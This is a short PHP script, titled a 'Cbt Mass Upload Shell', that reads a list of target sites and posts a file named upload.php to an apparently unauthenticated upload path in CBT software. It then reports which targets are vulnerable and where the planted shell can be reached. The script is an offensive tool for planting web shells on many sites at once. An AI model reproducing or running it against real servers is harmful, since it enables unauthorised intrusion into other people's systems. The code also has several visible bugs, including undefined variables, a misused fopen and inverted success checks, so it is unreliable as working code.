<?php

  echo "###########################\n";
  echo "#  Cbt Mass Upload Shell  #\n";
  echo "#   Created By MarsHall   #\n";
  echo "###########################\n";
  $file = file_get_contents(target.txt);
  $file2 = fopen($file, "rb");
  
  
$uploadfile="upload.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$file2/plugins/uploadfile/demo/demo.html");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Linux; Android 5.0.2; Redmi Note 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS, array('fileToUpload'=>"@$uploadfile2"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
$gagal = curl_error($ch);
curl_close($ch);
    
for($xy=0;$xy<count($subdo);$xy++){
    if($postResult){
   echo "Target Not Vuln  $gagal\n";
   }else{
   echo "Target Vuln : $target[$xy]\nAkses Shell : ../demo/uploads/upload.php\n";
   }
}
?>
